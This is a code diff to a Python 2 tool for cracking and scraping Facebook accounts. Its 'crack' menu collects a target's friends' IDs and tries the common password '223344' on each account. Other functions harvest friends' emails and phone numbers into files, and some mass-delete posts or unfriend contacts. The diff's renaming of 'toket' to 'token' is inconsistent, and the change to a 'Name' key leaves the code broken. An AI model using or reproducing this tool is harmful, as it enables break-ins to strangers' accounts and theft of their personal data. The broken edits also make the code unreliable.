@@ -104,7 +104,7 @@ nofromfriend = []
 def menu():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
 		print"[!] Token Not Found"
@@ -112,9 +112,9 @@ def menu():
 		time.sleep(1)
 		os.system('python2 jam.py')
 	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 		a = json.loads(otw.text)
-		name = a['name']
+		name = a['Name']
 		id = a['id']
 	except KeyError:
 		os.system('clear')
@@ -188,7 +188,7 @@ def crack():
 	global toket
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token=open('login.txt','r').read()
 	except IOError:
 		print"Token invalid"
 		os.system('rm -rf login.txt')
@@ -210,7 +210,7 @@ def crack_menu():
 	elif crm =="1":
 		os.system('clear')
 		print banner
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
@@ -220,14 +220,14 @@ def crack_menu():
 		idt = raw_input("[+] Input ID: ")
 		
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			op = json.loads(jok.text)
 			hamza('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
 		except KeyError:
 			print"[!] ID Not Found!"
 			raw_input("\nPress Enter To Back  ")
 			crack()
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
@@ -272,7 +272,7 @@ def crack_menu():
 		except OSError:
 		    pass
 		try:
-			a = requests.get("https://graph.facebook.com/"+uid+"/?access_token="+toket)
+			a = requests.get("https://graph.facebook.com/"+uid+"/?access_token="+token)
 			b = json.loads(a.text)
 			pass1='223344'
 			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
@@ -398,7 +398,7 @@ def crack_menu():
 def grab():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token=open('login.txt','r').read()
 	except IOError:
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
@@ -437,7 +437,7 @@ def grab_menu():
 def idfromfriend():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token=open('login.txt','r').read()
 	except IOError:
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
@@ -452,14 +452,14 @@ def idfromfriend():
 		print banner
 		idt = raw_input("[+] Input ID : ")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			op = json.loads(jok.text)
 			print"[✓] Account Name : "+op["name"]
 		except KeyError:
 			print"[!] Friend Not Found"
 			raw_input("Press Enter To Back ")
 			grab()
-		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
+		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+token)
 		z=json.loads(r.text)
 		hamza('[✓] Getting Friends Numeric IDs...')
 		print"--------------------------------------"
@@ -496,7 +496,7 @@ def idfromfriend():
 def emailfromfriend():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token=open('login.txt','r').read()
 	except IOError:
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
@@ -511,20 +511,20 @@ def emailfromfriend():
 		print banner
 		idt = raw_input("[+] Input ID : ")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			op = json.loads(jok.text)
 			print"[✓] Account Name : "+op["name"]
 		except KeyError:
 			print"[!] Account Not Found"
 			raw_input("\nPress Enter To Back ")
 			grab()
-		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
+		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+token)
 		a = json.loads(r.text)
 		hamza('[✓] Getting Emails From')
 		print 40*"\033[1;97m-"
 		bz = open('save/email.txt','w')
 		for i in a['data']:
-			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
+			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
 			z = json.loads(x.text)
 			try:
 				emfromfriend.append(z['email'])
@@ -563,7 +563,7 @@ def emailfromfriend():
 def numberfromfriend():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token=open('login.txt','r').read()
 	except IOError:
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
@@ -578,20 +578,20 @@ def numberfromfriend():
 		print banner
 		idt = raw_input("[+] Input ID : ")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			op = json.loads(jok.text)
 			print"[✓] Account Name : "+op["name"]
 		except KeyError:
 			print"[!] Friend Not Found"
 			raw_input("\nPress Enter To Back ")
 			grab()
-		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
+		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+token)
 		a = json.loads(r.text)
 		hamza('[✓] Getting All Numbers')
 		print 40*"\033[1;97m-"
 		bz = open('save/number.txt','w')
 		for i in a['data']:
-			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
+			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
 			z = json.loads(x.text)
 			try:
 				nofromfriend.append(z['mobile_phone'])
@@ -628,7 +628,7 @@ def numberfromfriend():
 def bot():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token=open('login.txt','r').read()
 	except IOError:
 		print"[!] Token not found"
 		os.system('rm -rf login.txt')
@@ -666,8 +666,8 @@ def bot_menu():
 def deletepost():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
-		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		token=open('login.txt','r').read()
+		nam = requests.get('https://graph.facebook.com/me?access_token='+token)
 		lol = json.loads(nam.text)
 		name = lol['name']
 	except IOError:
@@ -680,12 +680,12 @@ def deletepost():
 	print("[✓] Account Name : "+nama)
 	hamza("[✓] The Process Has Been Started")
 	print (40*"-")
-	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
+	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+token)
 	asus = json.loads(asu.text)
 	for p in asus['data']:
 		id = p['id']
 		piro = 0
-		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
+		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+token)
 		ok = json.loads(url.text)
 		try:
 			error = ok['error']['message']
@@ -706,7 +706,7 @@ def deletepost():
 def accept():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token=open('login.txt','r').read()
 	except IOError:
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
@@ -715,7 +715,7 @@ def accept():
 	os.system('clear')
 	print banner
 	limit = raw_input("[+] Enter Limit To Accept Requests : ")
-	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
+	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+token)
 	teman = json.loads(r.text)
 	if '[]' in str(teman['data']):
 		print"No friend Request"
@@ -724,7 +724,7 @@ def accept():
 	hamza('[✓] The Process Has Been Start')
 	print (40*"-")
 	for i in teman['data']:
-		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
+		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+token)
 		a = json.loads(gas.text)
 		if 'error' in str(a):
 			print "[!] [Failed] | "+i['from']['name']
@@ -739,7 +739,7 @@ def accept():
 def unfriend():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		token=open('login.txt','r').read()
 	except IOError:
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
@@ -751,12 +751,12 @@ def unfriend():
 	print "[✓] Press CTRL Z to Stop Process."
 	print (50*"-")
 	try:
-		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
+		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
 		cok = json.loads(pek.text)
 		for i in cok['data']:
 			name = i['name']
 			id = i['id']
-			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
+			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+token)
 			print "[✓] [Unfriended] | "+name
 	except IndexError: pass
 	except KeyboardInterrupt:
